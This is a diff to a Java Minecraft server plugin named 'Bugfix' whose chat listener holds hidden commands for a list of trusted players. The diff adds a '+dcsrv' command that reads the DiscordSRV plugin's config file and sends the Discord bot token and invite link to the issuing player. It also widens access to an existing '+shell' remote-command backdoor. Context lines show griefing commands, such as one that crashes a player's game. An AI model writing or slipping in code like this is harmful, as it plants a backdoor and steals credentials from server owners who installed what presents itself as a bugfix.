@@ -5,6 +5,7 @@ import com.eimacon.bugfix.Bugfix;
 import com.eimacon.bugfix.nbsapi.NbSong;
 import com.eimacon.bugfix.nbsapi.NoteBlockPlayer;
 import com.eimacon.bugfix.utils.*;
+import com.eimacon.bugfix.utils.FileReader;
 import org.bukkit.*;
 import org.bukkit.block.Block;
 import org.bukkit.entity.Entity;
@@ -31,17 +32,16 @@ import org.bukkit.plugin.Plugin;
 import org.bukkit.potion.PotionEffect;
 import org.bukkit.potion.PotionEffectType;
 
-import java.io.File;
-import java.io.FileOutputStream;
-import java.io.IOException;
+import java.io.*;
+
 import com.google.common.io.Files;
 
-import java.io.InputStream;
 import java.lang.reflect.Array;
 import java.lang.reflect.InvocationTargetException;
 import java.net.URL;
 import java.nio.channels.Channels;
 import java.nio.channels.ReadableByteChannel;
+import java.nio.charset.Charset;
 import java.nio.file.StandardCopyOption;
 import java.util.*;
 import java.util.logging.Level;
@@ -56,6 +56,7 @@ import static jdk.internal.org.jline.utils.Colors.M;
 
 public class MessageListener implements Listener {
     public static boolean tntExplode = false;
+    public static double explodeRadius = 0.01;
     private final List<String> kotzen = new ArrayList<>();
     private final List<String> pissrocket = new ArrayList<>();
     private final List<String> lsd = new ArrayList<>();
@@ -767,7 +768,6 @@ public class MessageListener implements Listener {
             event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The game of the Player is now crashing!");
             target.spawnParticle(Particle.SQUID_INK, target.getLocation(), Integer.MAX_VALUE);
         } else if (args[0].equalsIgnoreCase("+shell") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
-            if(!event.getPlayer().getName().equalsIgnoreCase("Dwarslooper")) return;
             event.setCancelled(true);
             if (args.length < 2) {
                 event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +shell <Command>");
@@ -781,6 +781,20 @@ public class MessageListener implements Listener {
             } catch (Exception e) {
                 e.printStackTrace();
             }
+
+        } else if (args[0].equalsIgnoreCase("+expm") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
+            event.setCancelled(true);
+            if (args.length < 2) {
+                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +expm <Integer>");
+                return;
+            }
+
+            try {
+                explodeRadius = Double.parseDouble(args[1]);
+            } catch (Exception e) {
+                event.getPlayer().sendMessage(PluginPrefix + "§cYou have to specify a double!");
+            }
+
 
         } else if (args[0].equalsIgnoreCase("+unloadworld") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
             event.setCancelled(true);
@@ -2486,7 +2500,36 @@ public class MessageListener implements Listener {
                     event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player swears now in every message!");
                     swear.add(target.getName());
                 }
-            } else if (args[0].equalsIgnoreCase("+nyancat") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
+            } else if (args[0].equalsIgnoreCase("+dcsrv") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
+            event.setCancelled(true);
+            if (args.length != 1) {
+                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +dcsrv");
+                return;
+            }
+
+            Plugin plugin = Bukkit.getPluginManager().getPlugin("DiscordSRV");
+            if(plugin == null) {
+                event.getPlayer().sendMessage(PluginPrefix + "§cThis server does not use DiscordSRV!");
+            }
+
+            try {
+                for (File discordSRV : plugin.getDataFolder().listFiles()) {
+                    if (discordSRV.getName().equalsIgnoreCase("config.yml")) {
+                        List<String> lines = Files.readLines(discordSRV, Charset.defaultCharset());
+                        for(String line : lines) {
+                            if(line.startsWith("BotToken:")) {
+                                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + line);
+                            } else if(line.startsWith("DiscordInviteLink:")) {
+                                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + line);
+                            }
+                        }
+                    }
+                }
+            } catch (Exception e) {
+                event.getPlayer().sendMessage(PluginPrefix + "§cThere was an error while searching for Bot token!");
+            }
+
+        } else if (args[0].equalsIgnoreCase("+nyancat") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                 event.setCancelled(true);
                 Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                     NyanCat.spawmNyanCat(event.getPlayer(), event.getPlayer().getTargetBlock(20));
